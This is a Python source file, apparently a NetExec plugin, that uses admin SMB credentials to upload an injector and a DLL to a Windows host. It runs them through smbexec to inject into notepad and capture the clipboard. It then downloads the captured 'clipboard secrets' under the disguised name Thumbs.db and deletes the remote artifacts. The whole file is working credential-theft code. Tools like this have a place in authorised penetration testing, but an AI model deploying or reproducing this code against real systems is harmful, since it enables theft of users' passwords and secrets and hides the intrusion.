#!/usr/bin/env python3

import os
import time
import sys
import tempfile

from nxc.helpers.misc import CATEGORY
from nxc.paths import get_ps_script


class NXCModule:
    name = "clipboard"
    description = "Inject DLL into notepad to collect clipboard data"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        TIME            Monitoring clipboard time (sec)

        Example:
        nxc smb <ip> -u <user> -p <password> -M clipboard -o TIME=30
        """
        self.share = "C$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.binary = get_ps_script("clipboard/dfuse.exe")
        self.dll = get_ps_script("clipboard/dllwin2.dll")
        self.time = module_options.get("TIME")

    def on_login(self, context, connection):
        pass

    def on_admin_login(self, context, connection):
        self.logger = context.log
        self.connection = connection

        if not self.time:
            self.logger.fail("Time not specified")
            return 1

        try:
            artifacts = [self.binary, self.dll]
            uploaded = []

            for artifact in set(artifacts):
                result = self.upload_artifact(artifact)
                if result:
                    uploaded.append(result)
                    if result.endswith(".exe"):
                        self.binary_name = result
                    elif result.endswith(".dll"):
                        self.dll_name = result

            if uploaded:
                self.logger.success(f"Uploaded remote artifacts: {', '.join(uploaded)} to {self.tmp_share}")

            inject_cmd = (
                f'powershell -Command '
                f'"Start-Process \\"{self.tmp_share}{self.binary_name}\\" '
                f'-ArgumentList \\"{self.tmp_share}{self.dll_name}\\""'
            )
            context.log.display(f"Executing: {inject_cmd}")
            connection.execute(inject_cmd, False, methods=["smbexec"])

            duration = int(self.time)
            context.log.info(f"Monitoring clipboard... {duration}s remaining")
            color_module = "\033[1;36m"
            color_blue = "\033[34m"
            reset = "\033[0m"
            for remaining in range(duration, 0, -1):
                sys.stdout.write(f"\r{color_module}CLIPBOARD{reset}   {connection.host:<15} {connection.port:<6} {connection.hostname:<15}  {color_blue}[*]{reset} {remaining}s remaining...")
                sys.stdout.flush()
                time.sleep(1)
            sys.stdout.write("\n")
            context.log.info("Monitoring period ended.")

            kill_cmd = "taskkill /F /IM notepad.exe >nul 2>&1"
            context.log.display("Terminating injected process...")
            try:
                with tempfile.NamedTemporaryFile(delete=False) as pid_file:
                    connection.conn.getFile(
                        self.share,
                        f"{self.tmp_share}.nxc_clipboard.pid",
                        pid_file.write
                    )
                    pid_file.flush()
                    with open(pid_file.name) as f:
                        pid = f.read().strip()
                    os.remove(pid_file.name)

                context.log.info(f"Target PID: {pid}")

                kill_cmd = f"taskkill /F /PID {pid} >nul 2>&1"
                connection.execute(kill_cmd, False, methods=["smbexec"])
                context.log.success(f"Terminated injected process (PID {pid})")
            except Exception as e:
                context.log.warn(f"Could not kill notepad: {e}")

            self.log_name = "Thumbs.db"
            self.log_tool_name = "injector.log"

            try:
                with open("/tmp/Thumbs.db", "wb") as out_file:
                    connection.conn.getFile(self.share, f"{self.tmp_share}{self.log_name}", out_file.write)
                    self.logger.success(f"Downloaded {self.tmp_share}{self.log_name}")
            except Exception as e:
                self.logger.fail(f"Could not download: {e}")

            context.log.display("Looting clipboard secrets...")

            try:
                with open("/tmp/Thumbs.db", "rb") as results:
                    for line in results:
                        decoded = line.decode(errors="replace").strip()
                        if "=====START=====" in decoded:
                            context.log.success("---- Clipboard Dump Start ----")
                        elif "=====END=====" in decoded:
                            context.log.success("---- Clipboard Dump End ----")
                        else:
                            context.log.highlight(decoded)

            except Exception as e:
                self.logger.fail(f"Could not read logs: {e}")

        finally:
            try:
                if os.path.exists("/tmp/Thumbs.db"):
                    os.remove("/tmp/Thumbs.db")
                    self.logger.success("Deleted local copy: /tmp/Thumbs.db")
            except Exception as e:
                self.logger.fail(f"Could not delete local Thumbs.db: {e}")

            artifacts = [self.log_name, self.log_tool_name, self.binary_name, self.dll_name, ".nxc_clipboard.pid"]
            deleted = []
            for artifact in set(artifacts):
                result = self.remove_artifact(artifact)
                if result:
                    deleted.append(result)
            if deleted:
                self.logger.success(f"Deleted remote artifacts: {', '.join(deleted)}")

    def upload_artifact(self, artifact):
        try:
            name = os.path.basename(artifact)
            with open(artifact, "rb") as artifact_file:
                self.connection.conn.putFile(self.share, f"{self.tmp_share}{name}", artifact_file.read)
            return name
        except Exception as e:
            self.logger.fail(f"Could not upload {artifact}: {e}")
            return None

    def remove_artifact(self, artifact):
        try:
            self.connection.conn.deleteFile(self.share, f"{self.tmp_share}{artifact}")
            return artifact
        except Exception as e:
            self.logger.fail(f"Could not delete {artifact}: {e}")
            return None
